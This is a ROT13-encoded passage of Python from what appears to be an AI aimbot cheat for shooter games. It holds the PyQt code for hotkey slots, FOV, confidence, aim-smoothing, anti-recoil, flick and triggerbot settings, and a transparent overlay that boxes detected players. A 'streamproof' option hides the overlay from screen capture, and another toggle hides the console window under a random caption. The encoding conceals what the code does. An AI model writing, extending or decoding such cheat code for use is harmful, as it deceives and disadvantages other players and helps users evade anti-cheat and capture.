    qrs fgneg_fryrpg_ubgxrl_fybg2(frys):
        frys.vf_fryrpgvat_ubgxrl_fybg2 = Gehr
        frys.Fybg2_Xrlovaq = Abar
        frys.oga_ubgxrl_fybg2.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl_fybg2).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl_fybg2(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl_fybg2:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Fybg2_Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl_fybg2 = Snyfr
                    xrl_anzr_pbairegrq_fybg2 = XRL_ANZRF.trg(frys.Fybg2_Xrlovaq, s"0k{frys.Fybg2_Xrlovaq:02K}")
                    frys.oga_ubgxrl_fybg2.frgGrkg(s"{xrl_anzr_pbairegrq_fybg2}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    # Fybg 3
    qrs fgneg_fryrpg_ubgxrl_fybg3(frys):
        frys.vf_fryrpgvat_ubgxrl_fybg3 = Gehr
        frys.Fybg3_Xrlovaq = Abar
        frys.oga_ubgxrl_fybg3.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl_fybg3).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl_fybg3(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl_fybg3:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Fybg3_Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl_fybg3 = Snyfr
                    xrl_anzr_pbairegrq_fybg3 = XRL_ANZRF.trg(frys.Fybg3_Xrlovaq, s"0k{frys.Fybg3_Xrlovaq:02K}")
                    frys.oga_ubgxrl_fybg3.frgGrkg(s"{xrl_anzr_pbairegrq_fybg3}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    # Fybg 4
    qrs fgneg_fryrpg_ubgxrl_fybg4(frys):
        frys.vf_fryrpgvat_ubgxrl_fybg4 = Gehr
        frys.Fybg4_Xrlovaq = Abar
        frys.oga_ubgxrl_fybg4.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl_fybg4).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl_fybg4(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl_fybg4:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Fybg4_Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl_fybg4 = Snyfr
                    xrl_anzr_pbairegrq_fybg4 = XRL_ANZRF.trg(frys.Fybg4_Xrlovaq, s"0k{frys.Fybg4_Xrlovaq:02K}")
                    frys.oga_ubgxrl_fybg4.frgGrkg(s"{xrl_anzr_pbairegrq_fybg4}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    # Fybg 5
    qrs fgneg_fryrpg_ubgxrl_fybg5(frys):
        frys.vf_fryrpgvat_ubgxrl_fybg5 = Gehr
        frys.Fybg5_Xrlovaq = Abar
        frys.oga_ubgxrl_fybg5.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl_fybg5).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl_fybg5(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl_fybg5:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Fybg5_Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl_fybg5 = Snyfr
                    xrl_anzr_pbairegrq_fybg5 = XRL_ANZRF.trg(frys.Fybg5_Xrlovaq, s"0k{frys.Fybg5_Xrlovaq:02K}")
                    frys.oga_ubgxrl_fybg5.frgGrkg(s"{xrl_anzr_pbairegrq_fybg5}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    # Fybg 6
    qrs fgneg_fryrpg_ubgxrl_fybg6(frys):
        frys.vf_fryrpgvat_ubgxrl_fybg6 = Gehr
        frys.Fybg6_Xrlovaq = Abar
        frys.oga_ubgxrl_fybg6.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl_fybg6).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl_fybg6(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl_fybg6:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Fybg6_Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl_fybg6 = Snyfr
                    xrl_anzr_pbairegrq_fybg6 = XRL_ANZRF.trg(frys.Fybg6_Xrlovaq, s"0k{frys.Fybg6_Xrlovaq:02K}")
                    frys.oga_ubgxrl_fybg6.frgGrkg(s"{xrl_anzr_pbairegrq_fybg6}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    qrs pnyphyngr_pbybe(frys, uhr, bcnpvgl, yvtugarff):
        bireynl_pbybe = DPbybe.sebzUfy(235, 87, 78)
        bireynl_pbybe.frgNycun(100)
        erghea bireynl_pbybe

    qrs ba_fyvqre_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba = ebhaq(inyhr / 10) * 10
        frys.fyvqre.frgInyhr(gvpx_cbfvgvba)
        tybony Sbi_Fvmr
        Sbi_Fvmr = gvpx_cbfvgvba
        frys.Sbi_Fvmr_ynory.frgGrkg(s'SBI: {fge(Sbi_Fvmr)}')

    qrs ba_fyvqre0_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba0 = ebhaq(inyhr / 1) * 1
        frys.fyvqre0.frgInyhr(gvpx_cbfvgvba0)
        tybony Pbasvqrapr
        Pbasvqrapr = gvpx_cbfvgvba0
        frys.Pbasvqrapr_ynory.frgGrkg(s'Pbasvqrapr: {fge(Pbasvqrapr)}%')

    qrs ba_fyvqre_scf_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba0e = ebhaq(inyhr / 1) * 1
        frys.fyvqre_scf.frgInyhr(gvpx_cbfvgvba0e)
        tybony Zbqry_SCF
        Zbqry_SCF = gvpx_cbfvgvba0e
        frys.scf_ynory.frgGrkg(s'Znk SCF: {fge(Zbqry_SCF)}')

    qrs ba_fyvqre3_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        #gvpx_cbfvgvba3 = ebhaq(inyhr)
        gvpx_cbfvgvba3 = ebhaq(inyhr / 5) * 5
        frys.fyvqre3.frgInyhr(gvpx_cbfvgvba3)
        tybony Nvz_Fzbbgu
        Nvz_Fzbbgu = gvpx_cbfvgvba3
        frys.Nvz_Fzbbgu_ynory.frgGrkg(s'NV Fgeratgu: {fge(Nvz_Fzbbgu)}')

    qrs ba_fyvqre4_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba4 = ebhaq(inyhr / 1) * 1
        frys.fyvqre4.frgInyhr(gvpx_cbfvgvba4)
        tybony Znk_Qrgrpgvbaf
        Znk_Qrgrpgvbaf = gvpx_cbfvgvba4
        frys.Znk_Qrgrpgvbaf_ynory.frgGrkg(s'Znk Qrgrpgvbaf: {fge(Znk_Qrgrpgvbaf)}')

    qrs ba_fyvqre5_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba5 = ebhaq(inyhr / 1) * 1
        frys.fyvqre5.frgInyhr(gvpx_cbfvgvba5)
        tybony Nhgb_Sver_Sbi_Fvmr
        Nhgb_Sver_Sbi_Fvmr = gvpx_cbfvgvba5
        frys.Nhgb_Sver_Sbi_Fvmr_ynory.frgGrkg(s'SBI Fvmr: {fge(Nhgb_Sver_Sbi_Fvmr)}')

    qrs ba_fyvqre60_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba60 = ebhaq(inyhr / 1) * 1
        frys.fyvqre60.frgInyhr(gvpx_cbfvgvba60)
        tybony NagvErpbvy_Fgeratgu
        NagvErpbvy_Fgeratgu = gvpx_cbfvgvba60
        frys.NagvErpbvy_Fgeratgu_ynory.frgGrkg(s'Fgeratgu: {fge(NagvErpbvy_Fgeratgu)}')

    qrs ba_fyvqre_fybg1_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba = ebhaq(inyhr / 10) * 10
        frys.fyvqre_fybg1.frgInyhr(gvpx_cbfvgvba)
        tybony Sbi_Fvmr_Fybg1
        Sbi_Fvmr_Fybg1 = gvpx_cbfvgvba
        frys.Sbi_Fvmr_ynory_fybg1.frgGrkg(s'SBI: {fge(Sbi_Fvmr_Fybg1)}')

    qrs ba_fyvqre_fybg2_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba = ebhaq(inyhr / 10) * 10
        frys.fyvqre_fybg2.frgInyhr(gvpx_cbfvgvba)
        tybony Sbi_Fvmr_Fybg2
        Sbi_Fvmr_Fybg2 = gvpx_cbfvgvba
        frys.Sbi_Fvmr_ynory_fybg2.frgGrkg(s'SBI: {fge(Sbi_Fvmr_Fybg2)}')

    qrs ba_fyvqre_fybg3_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba = ebhaq(inyhr / 10) * 10
        frys.fyvqre_fybg3.frgInyhr(gvpx_cbfvgvba)
        tybony Sbi_Fvmr_Fybg3
        Sbi_Fvmr_Fybg3 = gvpx_cbfvgvba
        frys.Sbi_Fvmr_ynory_fybg3.frgGrkg(s'SBI: {fge(Sbi_Fvmr_Fybg3)}')

    qrs ba_fyvqre_fybg4_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba = ebhaq(inyhr / 10) * 10
        frys.fyvqre_fybg4.frgInyhr(gvpx_cbfvgvba)
        tybony Sbi_Fvmr_Fybg4
        Sbi_Fvmr_Fybg4 = gvpx_cbfvgvba
        frys.Sbi_Fvmr_ynory_fybg4.frgGrkg(s'SBI: {fge(Sbi_Fvmr_Fybg4)}')

    qrs ba_fyvqre_fybg5_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba = ebhaq(inyhr / 10) * 10
        frys.fyvqre_fybg5.frgInyhr(gvpx_cbfvgvba)
        tybony Sbi_Fvmr_Fybg5
        Sbi_Fvmr_Fybg5 = gvpx_cbfvgvba
        frys.Sbi_Fvmr_ynory_fybg5.frgGrkg(s'SBI: {fge(Sbi_Fvmr_Fybg5)}')

    qrs ba_syvpx_fpbcr_fyvqre_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba_syvpx_fpbcr = ebhaq(inyhr / 1) * 1
        frys.syvpx_fpbcr_fyvqre.frgInyhr(gvpx_cbfvgvba_syvpx_fpbcr)
        tybony Syvpx_Fpbcr_Fraf
        Syvpx_Fpbcr_Fraf = gvpx_cbfvgvba_syvpx_fpbcr
        frys.syvpx_fpbcr_ynory.frgGrkg(s'Syvpx Fgeratgu: {fge(Syvpx_Fpbcr_Fraf)}%')

    qrs ba_syvpx_pbby_fyvqre_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba_pbbyqbja = ebhaq(inyhr / 5) * 5 / 100.0
        frys.syvpx_pbby_fyvqre.frgInyhr(vag(gvpx_cbfvgvba_pbbyqbja * 100))
        tybony Syvpx_Pbbyqbja
        Syvpx_Pbbyqbja = gvpx_cbfvgvba_pbbyqbja
        frys.syvpx_pbby_ynory.frgGrkg(s'Pbby Qbja: {fge(Syvpx_Pbbyqbja)}f')

    qrs ba_syvpx_qrynl_fyvqre_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba_qrynl = inyhr / 1000.0
        frys.syvpx_qrynl_fyvqre.frgInyhr(vag(gvpx_cbfvgvba_qrynl * 1000))
        tybony Syvpx_Qrynl
        Syvpx_Qrynl = gvpx_cbfvgvba_qrynl
        frys.syvpx_qrynl_ynory.frgGrkg(s'Fubg Qrynl: {fge(Syvpx_Qrynl)}f')

    qrs ba_fyvqre6_inyhr_punatr(frys, inyhr):
        frys.nhgb_fnir_pbasvt()
        gvpx_cbfvgvba6 = ebhaq(inyhr / 1) * 1
        frys.fyvqre6.frgInyhr(gvpx_cbfvgvba6)
        tybony Nhgb_Sver_Pbasvqrapr
        Nhgb_Sver_Pbasvqrapr = gvpx_cbfvgvba6
        frys.Nhgb_Sver_Pbasvqrapr_ynory.frgGrkg(s'Pbasvqrapr: {fge(Nhgb_Sver_Pbasvqrapr)}%')

    qrs gbttyr_purpxobk1(frys, fgngr):
        frys.nhgb_fnir_pbasvt()
        # Hcqngr gur tybony inevnoyr Ranoyr_Nvz
        tybony Ranoyr_Nvz
        Ranoyr_Nvz = fgngr == Dg.Hapurpxrq

        # Gbttyr gur fgngr bs gur purpxobk
        frys.Ranoyr_Nvz_purpxobk.frgPurpxrq(abg Ranoyr_Nvz)

        DNccyvpngvba.cebprffRiragf()
        frys.nhgb_fnir_pbasvt()

    qrs ba_purpxobk_fgngr_punatr(frys, fgngr):
        frys.nhgb_fnir_pbasvt()
        vs frys.fraqre() == frys.Ranoyr_Nvz_purpxobk:
            tybony Ranoyr_Nvz
            Ranoyr_Nvz = (fgngr == Dg.Purpxrq)
        # vs frys.fraqre() == frys.Fgernzcebbs_purpxobk:
        # 	tybony Fgernzcebbs
        # 	Fgernzcebbs = (fgngr == Dg.Purpxrq)
        vs frys.fraqre() == frys.Ranoyr_Nvz_Fybg1_purpxobk:
            tybony Ranoyr_Nvz_Fybg1
            Ranoyr_Nvz_Fybg1 = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Ranoyr_Nvz_Fybg2_purpxobk:
            tybony Ranoyr_Nvz_Fybg2
            Ranoyr_Nvz_Fybg2 = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Ranoyr_Nvz_Fybg3_purpxobk:
            tybony Ranoyr_Nvz_Fybg3
            Ranoyr_Nvz_Fybg3 = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Ranoyr_Nvz_Fybg4_purpxobk:
            tybony Ranoyr_Nvz_Fybg4
            Ranoyr_Nvz_Fybg4 = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Ranoyr_Nvz_Fybg5_purpxobk:
            tybony Ranoyr_Nvz_Fybg5
            Ranoyr_Nvz_Fybg5 = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Ranoyr_Fybgf_purpxobk:
            tybony Ranoyr_Fybgf
            Ranoyr_Fybgf = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Fubj_Sbi_purpxobk:
            tybony Fubj_Sbi
            Fubj_Sbi = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Fubj_Pebffunve_purpxobk:
            tybony Fubj_Pebffunve
            Fubj_Pebffunve = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Fubj_PZQ_purpxobk:
            xreary32 = pglcrf.JvaQYY('xreary32')
            hfre32 = pglcrf.JvaQYY('hfre32')
            uJaq = xreary32.TrgPbafbyrJvaqbj()
            FJ_UVQR = 0
            FJ_FUBJ = 5	
            hfre32.FubjJvaqbj(uJaq, FJ_UVQR vs hfre32.VfJvaqbjIvfvoyr(uJaq) ryfr FJ_FUBJ)

        vs frys.fraqre() == frys.Fubj_Qroht_purpxobk:
            tybony Fubj_Qroht
            Fubj_Qroht = (fgngr == Dg.Purpxrq)
            vs Fubj_Qroht == Snyfr:
                ujaq = jva32thv.SvaqJvaqbj(Abar, enaqbz_pncgvba1)
                jva32thv.FubjJvaqbj(ujaq, jva32pba.FJ_UVQR)
            ryfr:
                ujaq = jva32thv.SvaqJvaqbj(Abar, enaqbz_pncgvba1)
                jva32thv.FubjJvaqbj(ujaq, jva32pba.FJ_FUBJABEZNY)

        vs frys.fraqre() == frys.Fubj_SCF_purpxobk:
            tybony Fubj_SCF
            Fubj_SCF = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Ranoyr_GevttreObg_purpxobk:
            tybony Ranoyr_GevttreObg
            Ranoyr_GevttreObg = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Fubj_Qrgrpgvbaf_purpxobk:
            tybony Fubj_Qrgrpgvbaf
            Fubj_Qrgrpgvbaf = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Fubj_Nvzyvar_purpxobk:
            tybony Fubj_Nvzyvar
            Fubj_Nvzyvar = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Erdhver_Xrlovaq_purpxobk:
            tybony Erdhver_Xrlovaq
            Erdhver_Xrlovaq = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Pbagebyyre_Ba_purpxobk:
            tybony Pbagebyyre_Ba
            Pbagebyyre_Ba = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.PhcZbqr_Ba_purpxobk:
            tybony PhcZbqr_Ba
            PhcZbqr_Ba = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Erqhpr_Oybbz_purpxobk:
            tybony Erqhpr_Oybbz
            Erqhpr_Oybbz = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Erdhver_NQF_purpxobk:
            tybony Erdhver_NQF
            Erdhver_NQF = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.NagvErpbvy_Ba_purpxobk:
            tybony NagvErpbvy_Ba
            NagvErpbvy_Ba = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Ranoyr_Syvpx_purpxobk:
            tybony Ranoyr_Syvpx_Obg
            Ranoyr_Syvpx_Obg = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Hfr_Uhr_purpxobk:
            tybony Hfr_Uhr
            Hfr_Uhr = (fgngr == Dg.Purpxrq)

        vs frys.fraqre() == frys.Hfr_Zbqry_Pynff_purpxobk:
            tybony Hfr_Zbqry_Pynff
            Hfr_Zbqry_Pynff = (fgngr == Dg.Purpxrq)

        frys.nhgb_fnir_pbasvt()

pynff UhrHcqngreGuernq(guernqvat.Guernq):
    qrs __vavg__(frys, cnerag):
        fhcre().__vavg__()
        frys.cnerag = cnerag
        frys.uhr = 0
        frys.ehaavat = Gehr

    qrs eha(frys):
        juvyr frys.ehaavat:
            # Hcqngr uhr inyhr
            frys.uhr = (frys.uhr + 1) % 360
            gvzr.fyrrc(0.025)  # Nqwhfg gur fyrrc gvzr sbe fzbbgure navzngvba

    qrs fgbc(frys):
        frys.ehaavat = Snyfr

pynff QrgrpgvbaObk(DJvqtrg):
    qrs __vavg__(frys):
        fhcre().__vavg__()
        frys.frgJvaqbjSyntf(Dg.Gbby | Dg.SenzryrffJvaqbjUvag | Dg.JvaqbjFgnlfBaGbcUvag | Dg.JvaqbjGenafcneragSbeVachg | Dg.JvaqbjQbrfAbgNpprcgSbphf)
        frys.frgNggevohgr(Dg.JN_GenafyhpragOnpxtebhaq)
        frys.frgNggevohgr(Dg.JN_GenafcneragSbeZbhfrRiragf)
        frys.frgNggevohgr(Dg.JN_FubjJvgubhgNpgvingvat)
        frys.ybnq_pbasvt()
        tybony Sbi_Fvmr
        frys.Sbi_Fvmr = Sbi_Fvmr
        frys.frgTrbzrgel(vag(fperra_erf_K - frys.Sbi_Fvmr+2) // 2, vag(fperra_erf_L - frys.Sbi_Fvmr+2) // 2, frys.Sbi_Fvmr+25, frys.Sbi_Fvmr+25)
        jvaqbj_unaqyr = vag(frys.jvaVq())
        hfre32.FrgJvaqbjQvfcynlNssvavgl(jvaqbj_unaqyr, 0k00000011) vs Fgernzcebbs ryfr hfre32.FrgJvaqbjQvfcynlNssvavgl(jvaqbj_unaqyr, 0k00000000)
        frys.qrgrpgrq_cynlref = []

        frys.uhr_hcqngre = UhrHcqngreGuernq(frys)
        frys.uhr_hcqngre.fgneg()

        frys.pheerag_fybg_fryrpgrqq = 1
        frys.hcqngr_sbi_fvmr()

        frys.gvzre = DGvzre(frys)
        frys.gvzre.gvzrbhg.pbaarpg(frys.hcqngr)
        frys.gvzre.fgneg(100)
        frys.fgneg_gvzr = gvzr.cres_pbhagre()

        frys.xrl_fgngrf = {xrl: Snyfr sbe xrl va [Fybg1_Xrlovaq, Fybg2_Xrlovaq, Fybg3_Xrlovaq, Fybg4_Xrlovaq, Fybg5_Xrlovaq, Fybg6_Xrlovaq] vs xrl vf abg Abar}

        frys.xrl_purpx_gvzre = DGvzre(frys)
        frys.xrl_purpx_gvzre.gvzrbhg.pbaarpg(frys.purpx_xrl_fgngrf)
        frys.xrl_purpx_gvzre.fgneg(10)

    qrs hcqngr_qrgrpgrq_cynlref(frys, qrgrpgrq_cynlref):
        frys.qrgrpgrq_cynlref = qrgrpgrq_cynlref
        frys.hcqngr()

    qrs pyrne_qrgrpgrq_cynlref(frys):
        frys.qrgrpgrq_cynlref = []
        frys.hcqngr()

    qrs scf(frys):
        erghea vag(1.5 / (gvzr.cres_pbhagre() - frys.fgneg_gvzr))

    qrs ybnq_pbasvt(frys):
        jvgu bcra('./pbasvt.wfba', 'e') nf vasvyr:
            pbasvt_frggvatf = wfbaq.ybnq(vasvyr)

        frys.Hfr_Uhr = pbasvt_frggvatf['Hfr_Uhr']

        # frys.sbi_pbybe = DPbybe(
        # 	pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("erq", 255),
        # 	pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("terra", 255),
        # 	pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("oyhr", 255),
        # 	pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("bcnpvgl", 255)
        # )

        frys.sbi_pbybe = DPbybe(255,255,255,255)
        frys.yvtugarff = pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("yvtugarff", 128)  # Nqq guvf yvar

        frys.sbi_pbybe_bhgyvar = DPbybe(
            0,
            0,
            0,
            pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("bcnpvgl", 255)
        )

        # frys.jngreznex_pbybe = DPbybe(
        # 	pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("erq", 255),
        # 	pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("terra", 255),
        # 	pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("oyhr", 255),
        # 	pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("bcnpvgl", 255)
        # )
        frys.jngreznex_pbybe = DPbybe(151,159,251,255)
        frys.jngreznex_pbybe_bhgyvar = DPbybe(
            0,
            0,
            0,
            0
        )

        frys.pebffunve_qbg_pbybe = DPbybe(
            pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("erq", 255),
            pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("terra", 255),
            pbasvt_frggvatf.trg("ETON_Inyhr", {}).trg("oyhr", 255),
            255
        )
        frys.pebffunve_pbybe = DPbybe(255, 255, 255, 255)  # Pebffunve pbybe jvgu shyy bcnpvgl

        frys.sbi_guvpxarff = 1.5
        frys.jngreznex_guvpxarff = 0.5
        frys.pebffunve_guvpxarff = 1.5

    qrs OyhrNQF(frys):
        erghea Gehr vs jva32ncv.TrgXrlFgngr(jva32pba.IX_EOHGGBA) va (-127, -128) ryfr Snyfr
        cnff

    qrs OyhrSver(frys):
        erghea Gehr vs jva32ncv.TrgXrlFgngr(jva32pba.IX_YOHGGBA) va (-127, -128) ryfr Snyfr
        cnff

    qrs purpx_xrl_fgngrf(frys):
        vs Ranoyr_Fybgf:
            # Purpx rnpu xrl naq hcqngr fgngrf
            sbe xrl, fybg va mvc([Fybg1_Xrlovaq, Fybg2_Xrlovaq, Fybg3_Xrlovaq, Fybg4_Xrlovaq, Fybg5_Xrlovaq, Fybg6_Xrlovaq], enatr(1, 7)):
                vs xrl vf abg Abar:
                    # Purpx vs gur xrl vf va frys.xrl_fgngrf
                    vs xrl abg va frys.xrl_fgngrf:
                        cevag(s"[Enmbe] -> xrl {xrl} abg sbhaq va xrl_fgngrf")
                        frys.xrl_fgngrf[xrl] = Snyfr  # Vavgvnyvmr gur fgngr vs vg'f zvffvat
                    pheerag_fgngr = jva32ncv.TrgNflapXrlFgngr(xrl) < 0
                    vs pheerag_fgngr naq abg frys.xrl_fgngrf[xrl]:
                        # Xrl unf orra cerffrq qbja
                        frys.pheerag_fybg_fryrpgrqq = fybg
                        frys.hcqngr_sbi_fvmr()
                    frys.xrl_fgngrf[xrl] = pheerag_fgngr

        vs abg Ranoyr_Fybgf:
            frys.Sbi_Fvmr = Sbi_Fvmr

        frys.hcqngr()

    qrs hcqngr_sbi_fvmr(frys):
        vs Ranoyr_Fybgf:
            vs frys.pheerag_fybg_fryrpgrqq vf abg Abar:
                vs frys.pheerag_fybg_fryrpgrqq == 1:
                    frys.Sbi_Fvmr = Sbi_Fvmr_Fybg1
                ryvs frys.pheerag_fybg_fryrpgrqq == 2:
                    frys.Sbi_Fvmr = Sbi_Fvmr_Fybg2
                ryvs frys.pheerag_fybg_fryrpgrqq == 3:
                    frys.Sbi_Fvmr = Sbi_Fvmr_Fybg3
                ryvs frys.pheerag_fybg_fryrpgrqq == 4:
                    frys.Sbi_Fvmr = Sbi_Fvmr_Fybg4
                ryvs frys.pheerag_fybg_fryrpgrqq == 5:
                    frys.Sbi_Fvmr = Sbi_Fvmr_Fybg5
                ryvs frys.pheerag_fybg_fryrpgrqq == 6:
                    frys.Sbi_Fvmr = 15
            ryfr:
                frys.Sbi_Fvmr = Sbi_Fvmr
        vs abg Ranoyr_Fybgf:
            frys.Sbi_Fvmr = Sbi_Fvmr

        frys.frgTrbzrgel(vag(fperra_erf_K-4 - frys.Sbi_Fvmr+2) // 2, vag(fperra_erf_L-4 - frys.Sbi_Fvmr+2) // 2, frys.Sbi_Fvmr+25, frys.Sbi_Fvmr+25)
        frys.hcqngr()

    qrs cnvagRirag(frys, rirag):

        cnvagre = DCnvagre(frys)
        cnvagre.frgEraqreUvag(DCnvagre.Nagvnyvnfvat)
        vs abg Ranoyr_Fybgf:
            frys.frgTrbzrgel(vag(fperra_erf_K-4 - frys.Sbi_Fvmr+2) // 2, vag(fperra_erf_L-4 - frys.Sbi_Fvmr+2) // 2, frys.Sbi_Fvmr+25, frys.Sbi_Fvmr+25)
        frys.ybnq_pbasvt()

        sbag_fvmr_ck = 11
        sbag = DSbag("Ireqnan")
        sbag.frgCvkryFvmr(sbag_fvmr_ck)
        cnvagre.frgSbag(sbag)

        vs PhcZbqr_Ba:
            cnff
        ryvs PhcZbqr_Ba == Snyfr:

            vs frys.pheerag_fybg_fryrpgrqq == 6:
                vs Ranoyr_Fybgf:
                    cnff
            ryfr:
                vs Fubj_Sbi:
                    pragre_k = frys.Sbi_Fvmr // 2
                    pragre_l = frys.Sbi_Fvmr // 2
                    sbi_enqvhf = frys.Sbi_Fvmr // 2 - frys.sbi_guvpxarff // 2
                    vs Hfr_Uhr:
                        sbi_guvpxarff = 1.1
                        ahz_frpgvbaf = 360
                        frpgvba_natyr = 360 / ahz_frpgvbaf

                        sbe v va enatr(ahz_frpgvbaf):
                            uhr = (frys.uhr_hcqngre.uhr + v) % 360
                            pbybe = DPbybe.sebzUfi(uhr, 175, 255)
                            cra = DCra(pbybe, sbi_guvpxarff, Dg.FbyvqYvar)
                            cnvagre.frgCra(cra)
                            fgneg_natyr = v * frpgvba_natyr * 16
                            raq_natyr = (v + 1) * frpgvba_natyr * 16
                            erpg = DErpg(vag(pragre_k + 2 - sbi_enqvhf), vag(pragre_l + 2 - sbi_enqvhf), vag(2 * sbi_enqvhf), vag(2 * sbi_enqvhf))
                            cnvagre.qenjNep(erpg, vag(fgneg_natyr), vag(frpgvba_natyr * 16))
                    ryfr:
                        sbi_erpg = DErpgS(pragre_k+2 - sbi_enqvhf, pragre_l+2 - sbi_enqvhf, 2 * sbi_enqvhf, 2 * sbi_enqvhf)
                        cnvagre.frgCra(DCra(frys.sbi_pbybe, frys.sbi_guvpxarff, Dg.FbyvqYvar))
                        cnvagre.qenjRyyvcfr(sbi_erpg)
                        vs Ivfhny_Bhgyvarf:
                            vaare_enqvhf = sbi_enqvhf - 1.0
                            bhgre_enqvhf = sbi_enqvhf + 1.0
                            cra_vaare = DCra(frys.sbi_pbybe_bhgyvar, 0.6)
                            cra_bhgre = DCra(frys.sbi_pbybe_bhgyvar, 0.6)
                            cnvagre.frgCra(cra_vaare)
                            vaare_erpg = DErpg(vag(pragre_k+2 - vaare_enqvhf), vag(pragre_l+2 - vaare_enqvhf), vag(2 * vaare_enqvhf), vag(2 * vaare_enqvhf))
                            cnvagre.qenjRyyvcfr(vaare_erpg)
                            cnvagre.frgCra(cra_bhgre)
                            bhgre_erpg = DErpg(vag(pragre_k+2 - bhgre_enqvhf), vag(pragre_l+2 - bhgre_enqvhf), vag(2 * bhgre_enqvhf), vag(2 * bhgre_enqvhf))
                            cnvagre.qenjRyyvcfr(bhgre_erpg)

            vs Fubj_Pebffunve:
                vs frys.OyhrSver():
                    cra_pebffunve_nqf = DCra(DPbybe(255, 255, 255, 255), 0.3, Dg.FbyvqYvar)
                    cnvagre.frgCra(cra_pebffunve_nqf)
                    cnvagre.frgEraqreUvag(DCnvagre.Nagvnyvnfvat, Snyfr)
                    pragre_k = frys.jvqgu() // 2 -11
